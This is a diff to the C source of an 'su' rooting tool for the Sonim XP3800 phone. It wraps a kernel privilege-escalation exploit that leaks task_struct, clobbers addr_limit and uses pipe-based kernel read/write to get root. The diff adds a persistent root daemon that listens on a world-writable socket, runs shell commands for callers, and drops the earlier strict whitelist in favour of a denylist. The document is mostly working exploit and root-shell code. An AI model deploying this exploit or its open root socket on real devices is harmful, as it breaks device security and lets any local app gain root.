@@ -7,8 +7,9 @@
  * Ported to Sonim XP3800 (32-bit ARM) by flipphoneguy
  */
 
-#define WHITELIST_PATH "/data/data/com.flipphoneguy.root.xp3/files/whitelist.txt"
 #define DENIED_PATH "/data/data/com.flipphoneguy.root.xp3/files/blacklist.txt"
+#define LOCK_PATH "/data/local/tmp/.su.lock"
+#define SOCKET_PATH "/data/local/tmp/.su.sock"
 #define PACKAGES_LIST "/data/system/packages.list"
 #define MAX_PACKAGE_NAME 256
 
@@ -52,6 +53,13 @@
 #include <sys/syscall.h>
 #include <errno.h>
 #include <stdarg.h>
+#include <sys/file.h>
+#include <sys/socket.h>
+#include <sys/un.h>
+#include <signal.h>
+#include <sched.h>
+#include <sys/select.h>
+#include <sys/stat.h>
 
 int quiet = 1;
 
@@ -475,50 +483,13 @@ void getPackageName(unsigned uid, char *packageName) {
     fclose(f);
 }
 
-int checkWhitelist(unsigned uid) {
+int checkDenylist(unsigned uid) {
     if (uid == 0 || uid == 2000) return 1;
 
     char parent[MAX_PACKAGE_NAME];
     getPackageName(uid, parent);
 
     if (!strcmp(parent, "com.termux")) return 1;
-
-    FILE *wl = fopen(WHITELIST_PATH, "r");
-    int strict_mode = 0;
-
-    if (wl != NULL) {
-        fseek(wl, 0, SEEK_END);
-        if (ftell(wl) > 0) {
-            strict_mode = 1;
-            rewind(wl);
-
-            char line[512];
-            while (fgets(line, sizeof(line), wl)) {
-                char *p = line;
-                while (*p && isspace(*p)) p++;
-                char *q = p + strlen(p) - 1;
-                while (q > p && isspace(*q)) *q-- = 0;
-
-                if (q <= p || *p == '#') continue;
-
-                if (*q == '*') {
-                    if (!strncmp(parent, p, q - p)) {
-                        fclose(wl);
-                        return 1;
-                    }
-                } else if (!strcmp(parent, p)) {
-                    fclose(wl);
-                    return 1;
-                }
-            }
-        }
-        fclose(wl);
-    }
-
-    if (strict_mode) {
-        message("denied by strict whitelist: %s", parent);
-        return 0;
-    }
 
     FILE *bl = fopen(DENIED_PATH, "r");
     if (bl != NULL) {
@@ -534,12 +505,12 @@ int checkWhitelist(unsigned uid) {
             if (*q == '*') {
                 if (!strncmp(parent, p, q - p)) {
                     fclose(bl);
-                    message("denied by blacklist: %s", parent);
+                    message("denied by denylist: %s", parent);
                     return 0;
                 }
             } else if (!strcmp(parent, p)) {
                 fclose(bl);
-                message("denied by blacklist: %s", parent);
+                message("denied by denylist: %s", parent);
                 return 0;
             }
         }
@@ -549,24 +520,187 @@ int checkWhitelist(unsigned uid) {
     return 1;
 }
 
-int main(int argc, char **argv) {
-    unsigned int oldUID = getuid();
+/* ===== DAEMON ===== */
 
-    if (argc >= 2 && (!strcmp(argv[1], "-v") || !strcmp(argv[1], "--verbose"))) {
-        quiet = 0;
-        for (int i = 1; i < argc - 1; i++)
-            argv[i] = argv[i + 1];
-        argc--;
+static void daemon_handle(int client) {
+    struct ucred peer;
+    socklen_t len = sizeof(peer);
+    if (getsockopt(client, SOL_SOCKET, SO_PEERCRED, &peer, &len) < 0) {
+        int err = -1;
+        write(client, &err, 4);
+        return;
     }
 
-    if (argc >= 2 && (!strcmp(argv[1], "-h") || !strcmp(argv[1], "--help"))) {
-        printf("Usage: su [OPTIONS] [COMMAND...]\nExamples:\n  su: pop out default shell rooted with selinux disabled\n  su -v | --verbose: Same but verbose output\n  su -s bash: specify shell interpreter. default is $SHELL (usually bash)\n  su -c id: run id as root and exit (like sudo)\n  su id: same\n  su -h | --help: print this help message and exit\n");
-        exit(0);
+    char buf[8192];
+    int fds[3] = {-1, -1, -1};
+    struct msghdr msg = {0};
+    struct iovec iov = { .iov_base = buf, .iov_len = sizeof(buf) - 1 };
+    char cmsgbuf[CMSG_SPACE(3 * sizeof(int))];
+    msg.msg_iov = &iov;
+    msg.msg_iovlen = 1;
+    msg.msg_control = cmsgbuf;
+    msg.msg_controllen = sizeof(cmsgbuf);
+
+    ssize_t n = recvmsg(client, &msg, 0);
+    if (n <= 0) return;
+    buf[n] = 0;
+
+    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
+    if (cmsg && cmsg->cmsg_level == SOL_SOCKET && cmsg->cmsg_type == SCM_RIGHTS)
+        memcpy(fds, CMSG_DATA(cmsg), 3 * sizeof(int));
+
+    if (fds[0] < 0) return;
+
+    char *end = buf + n;
+    char *shell = buf;
+    char *cmd = memchr(shell, 0, end - shell);
+    if (!cmd || ++cmd >= end) { close(fds[0]); close(fds[1]); close(fds[2]); return; }
+    char *cwd = memchr(cmd, 0, end - cmd);
+    if (!cwd || ++cwd >= end) { close(fds[0]); close(fds[1]); close(fds[2]); return; }
+    char *path = memchr(cwd, 0, end - cwd);
+    if (!path || ++path >= end) { close(fds[0]); close(fds[1]); close(fds[2]); return; }
+    char *term = memchr(path, 0, end - path);
+    if (!term || ++term >= end) { close(fds[0]); close(fds[1]); close(fds[2]); return; }
+    char *home = memchr(term, 0, end - term);
+    if (!home || ++home >= end) { close(fds[0]); close(fds[1]); close(fds[2]); return; }
+    if (!checkDenylist(peer.uid)) {
+        int err = -1;
+        write(client, &err, 4);
+        close(fds[0]); close(fds[1]); close(fds[2]);
+        return;
     }
 
+    pid_t child = fork();
+    if (child == 0) {
+        close(client);
+        dup2(fds[0], 0); dup2(fds[1], 1); dup2(fds[2], 2);
+        close(fds[0]); close(fds[1]); close(fds[2]);
+        chdir(cwd);
+        setenv("PATH", path, 1);
+        setenv("TERM", term, 1);
+        setenv("HOME", home, 1);
+        if (cmd[0])
+            execl(shell, shell, "-c", cmd, (char *)0);
+        else
+            execl(shell, shell, (char *)0);
+        _exit(127);
+    }
+    close(fds[0]); close(fds[1]); close(fds[2]);
+
+    int status;
+    waitpid(child, &status, 0);
+    int exit_code = WIFEXITED(status) ? WEXITSTATUS(status) : 1;
+    write(client, &exit_code, 4);
+}
+
+static void daemon_main(int ready_fd) {
+    int nsfd = open("/proc/1/ns/mnt", O_RDONLY);
+    if (nsfd >= 0) {
+        setns(nsfd, 0);
+        close(nsfd);
+    }
+
+    setsid();
+    close(0); close(1); close(2);
+    open("/dev/null", O_RDONLY);
+    open("/dev/null", O_WRONLY);
+    open("/dev/null", O_WRONLY);
+
+    unlink(SOCKET_PATH);
+    int server = socket(AF_UNIX, SOCK_STREAM, 0);
+    struct sockaddr_un addr = {0};
+    addr.sun_family = AF_UNIX;
+    strncpy(addr.sun_path, SOCKET_PATH, sizeof(addr.sun_path) - 1);
+    bind(server, (struct sockaddr *)&addr, sizeof(addr));
+    chmod(SOCKET_PATH, 0666);
+    listen(server, 5);
+
+    if (ready_fd >= 0) {
+        write(ready_fd, "R", 1);
+        close(ready_fd);
+    }
+
+    signal(SIGCHLD, SIG_IGN);
+
+    while (1) {
+        int client = accept(server, NULL, NULL);
+        if (client < 0) continue;
+        pid_t handler = fork();
+        if (handler == 0) {
+            signal(SIGCHLD, SIG_DFL);
+            close(server);
+            daemon_handle(client);
+            close(client);
+            _exit(0);
+        }
+        close(client);
+    }
+}
+
+/* ===== CLIENT ===== */
+
+static int try_connect(void) {
+    int sock = socket(AF_UNIX, SOCK_STREAM, 0);
+    if (sock < 0) return -1;
+    struct sockaddr_un addr = {0};
+    addr.sun_family = AF_UNIX;
+    strncpy(addr.sun_path, SOCKET_PATH, sizeof(addr.sun_path) - 1);
+    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
+        close(sock);
+        return -1;
+    }
+    return sock;
+}
+
+static int client_request(int sock, const char *shell, const char *cmd,
+                          const char *cwd, const char *path, const char *term,
+                          const char *home) {
+    char buf[8192];
+    size_t pos = 0;
+    #define PACK(s) do { \
+        int r = snprintf(buf + pos, sizeof(buf) - pos, "%s", (s)); \
+        pos += r + 1; \
+        if (pos > sizeof(buf)) { close(sock); return -1; } \
+    } while(0)
+    PACK(shell);
+    PACK(cmd ? cmd : "");
+    PACK(cwd);
+    PACK(path ? path : "/system/bin");
+    PACK(term ? term : "xterm");
+    PACK(home ? home : "/data/local/tmp");
+    #undef PACK
+
+    int fds[3] = {0, 1, 2};
+    struct msghdr msg = {0};
+    struct iovec iov = { .iov_base = buf, .iov_len = pos };
+    char cmsgbuf[CMSG_SPACE(3 * sizeof(int))];
+    memset(cmsgbuf, 0, sizeof(cmsgbuf));
+    msg.msg_iov = &iov;
+    msg.msg_iovlen = 1;
+    msg.msg_control = cmsgbuf;
+    msg.msg_controllen = sizeof(cmsgbuf);
+    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
+    cmsg->cmsg_level = SOL_SOCKET;
+    cmsg->cmsg_type = SCM_RIGHTS;
+    cmsg->cmsg_len = CMSG_LEN(3 * sizeof(int));
+    memcpy(CMSG_DATA(cmsg), fds, 3 * sizeof(int));
+
+    if (sendmsg(sock, &msg, 0) <= 0) {
+        close(sock);
+        return -1;
+    }
+
+    int exit_code = -1;
+    read(sock, &exit_code, 4);
+    close(sock);
+    return exit_code;
+}
+
+/* ===== EXPLOIT (run once to bootstrap daemon) ===== */
+
+static void run_exploit(void) {
     message("starting exploit for Sonim XP3800 (32-bit ARM)");
 
-    // Phase 1: Leak task_struct pointer
     message("phase 1: leaking task_struct pointer");
     unsigned long slab_addr = 0, task_struct_ptr = 0;
     for (int i = 0; i < 10; i++) {
@@ -579,7 +713,6 @@ int main(int argc, char **argv) {
     if (!isKernelPointer(task_struct_ptr))
         error("failed to leak task_struct pointer");
 
-    // Phase 2: Read stack and cred pointers from task_struct
     message("phase 2: reading stack and cred from task_struct");
     unsigned long stack_ptr = 0, cred_ptr = 0;
     for (int i = 0; i < 5; i++) {
@@ -596,14 +729,12 @@ int main(int argc, char **argv) {
     unsigned long addr_limit = thread_info + OFFSET__thread_info__addr_limit;
     message("  thread_info=0x%08lx addr_limit=0x%08lx", thread_info, addr_limit);
 
-    // Phase 3: Clobber addr_limit to 0xFFFFFFFF
     message("phase 3: clobbering addr_limit");
     unsigned long new_limit = 0xFFFFFFFF;
     if (!clobber_with_retry(addr_limit, &new_limit, 4))
         error("failed to clobber addr_limit");
     message("  addr_limit clobbered");
 
-    // Phase 4: Kernel R/W via pipes — escalate privileges
     message("phase 4: escalating privileges");
     int krw[2];
     pipe(krw);
@@ -641,38 +772,142 @@ int main(int argc, char **argv) {
     close(krw[1]);
 
     message("root privileges ready (uid=%d)", getuid());
+}
 
-    if (!checkWhitelist(oldUID)) {
-        unsigned long one = 1;
-        int rw[2];
-        pipe(rw);
-        kernel_write(rw[0], rw[1], SELINUX_ENFORCING, &one, 4);
-        close(rw[0]);
-        close(rw[1]);
-        errno = 0;
-        error("denied by whitelist");
+/* ===== MAIN ===== */
+
+int main(int argc, char **argv) {
+    unsigned int oldUID = getuid();
+    char *shell_override = NULL;
+    char *cmd_arg = NULL;
+    int preserve_env = 0;
+
+    for (int i = 1; i < argc; i++) {
+        if (!strcmp(argv[i], "-v") || !strcmp(argv[i], "--verbose")) {
+            quiet = 0;
+        } else if (!strcmp(argv[i], "-h") || !strcmp(argv[i], "--help")) {
+            printf("Usage: su [OPTIONS] [COMMAND...]\n  su                       root shell\n  su -c 'cmd'              run command as root\n  su cmd                   same as -c\n  -s, --shell SHELL        specify shell\n  -p, --preserve-environment  preserve environment variables\n  --mount-master           mount master namespace\n  -v, --verbose            verbose output\n");
+            return 0;
+        } else if (!strcmp(argv[i], "-p") || !strcmp(argv[i], "--preserve-environment")) {
+            preserve_env = 1;
+        } else if (!strcmp(argv[i], "--mount-master")) {
+            /* accepted for sudo compatibility */
+        } else if (!strcmp(argv[i], "-s") || !strcmp(argv[i], "--shell")) {
+            if (i + 1 < argc) shell_override = argv[++i];
+        } else if (!strcmp(argv[i], "-c")) {
+            if (i + 1 < argc) {
+                static char cmd_buf[8192];
+                cmd_buf[0] = 0;
+                for (int j = i + 1; j < argc; j++) {
+                    if (j > i + 1) strcat(cmd_buf, " ");
+                    strncat(cmd_buf, argv[j], sizeof(cmd_buf) - strlen(cmd_buf) - 1);
+                }
+                cmd_arg = cmd_buf;
+                i = argc;
+            }
+        } else if (!cmd_arg) {
+            cmd_arg = argv[i];
+        }
     }
+
+    int use_caller_env = preserve_env || !cmd_arg;
 
     char _cwd[1024];
-    getcwd(_cwd, 1024);
-    char *_path = getenv("PATH");
+    getcwd(_cwd, sizeof(_cwd));
     char *_term = getenv("TERM");
-    char *_home = getenv("HOME");
-    char *_shell = getenv("SHELL");
-    if (argc >= 3 && !strcmp(argv[1], "-s")) {
-        _shell = argv[2];
-        for (int i = 1; i < argc - 1; i++) argv[i] = argv[i + 1];
-        argc--; argc--;
-    }
-    char cmd[4096];
-    sprintf(cmd, "cd %s && exec /system/bin/env PATH=%s TERM=%s HOME=%s %s",
-        _cwd, _path ? _path : "/system/bin", _term ? _term : "xterm", _home ? _home : "/data/local/tmp", _shell ? _shell : "/system/bin/sh");
-    if (argc == 2) strcpy(cmd, argv[1]);
-    else if (argc == 3 && !strcmp(argv[1], "-c")) strcpy(cmd, argv[2]);
-    execlp("/sbin/nsenter", "nsenter", "-t", "1", "-m", "sh", "-c", cmd, (char *)0);
-    execlp("/data/data/com.flipphoneguy.root.xp3/files/nsenter", "nsenter", "-t", "1", "-m", "sh", "-c", cmd, (char *)0);
-    execlp("nsenter", "nsenter", "-t", "1", "-m", "sh", "-c", cmd, (char *)0);
-    execlp("sh", "sh", "-c", cmd, (char *)0);
 
-    exit(0);
+    char *_shell;
+    if (shell_override)
+        _shell = shell_override;
+    else if (use_caller_env && getenv("SHELL"))
+        _shell = getenv("SHELL");
+    else
+        _shell = "/system/bin/sh";
+
+    char *_path = use_caller_env ? getenv("PATH") : "/sbin:/system/sbin:/system/bin:/system/xbin:/vendor/bin";
+    char *_home = use_caller_env ? getenv("HOME") : "/";
+
+    int sock = try_connect();
+    if (sock >= 0) {
+        message("connected to daemon");
+        int ret = client_request(sock, _shell, cmd_arg, _cwd, _path, _term, _home);
+        if (ret == -1) {
+            fprintf(stderr, "su: denied\n");
+            return 1;
+        }
+        return ret;
+    }
+
+    int lock_fd = open(LOCK_PATH, O_CREAT | O_RDWR, 0666);
+    if (lock_fd >= 0) flock(lock_fd, LOCK_EX);
+
+    sock = try_connect();
+    if (sock >= 0) {
+        if (lock_fd >= 0) { flock(lock_fd, LOCK_UN); close(lock_fd); }
+        message("connected to daemon (after lock)");
+        int ret = client_request(sock, _shell, cmd_arg, _cwd, _path, _term, _home);
+        if (ret == -1) {
+            fprintf(stderr, "su: denied\n");
+            return 1;
+        }
+        return ret;
+    }
+
+    if (!checkDenylist(oldUID)) {
+        if (lock_fd >= 0) { flock(lock_fd, LOCK_UN); close(lock_fd); }
+        fprintf(stderr, "su: denied\n");
+        return 1;
+    }
+
+    int started = 0;
+    for (int attempt = 0; attempt < 3; attempt++) {
+        if (attempt > 0) {
+            fprintf(stderr, "su: retrying exploit in 1s (%d/3)...\n", attempt + 1);
+            sleep(1);
+        }
+        int ready[2];
+        pipe(ready);
+        pid_t pid = fork();
+        if (pid == 0) {
+            close(ready[0]);
+            if (lock_fd >= 0) close(lock_fd);
+            run_exploit();
+            daemon_main(ready[1]);
+            _exit(0);
+        }
+        close(ready[1]);
+        char r = 0;
+        struct timeval tv;
+        fd_set fds;
+        FD_ZERO(&fds);
+        FD_SET(ready[0], &fds);
+        tv.tv_sec = 10;
+        tv.tv_usec = 0;
+        if (select(ready[0] + 1, &fds, NULL, NULL, &tv) > 0 && read(ready[0], &r, 1) == 1) {
+            started = 1;
+        }
+        close(ready[0]);
+        if (started) break;
+        waitpid(pid, NULL, WNOHANG);
+    }
+
+    if (lock_fd >= 0) { flock(lock_fd, LOCK_UN); close(lock_fd); }
+
+    if (!started) {
+        fprintf(stderr, "su: exploit failed after 3 attempts\n");
+        return 1;
+    }
+
+    sock = try_connect();
+    if (sock < 0) {
+        fprintf(stderr, "su: daemon started but connect failed\n");
+        return 1;
+    }
+
+    int ret = client_request(sock, _shell, cmd_arg, _cwd, _path, _term, _home);
+    if (ret == -1) {
+        fprintf(stderr, "su: denied\n");
+        return 1;
+    }
+    return ret;
 }
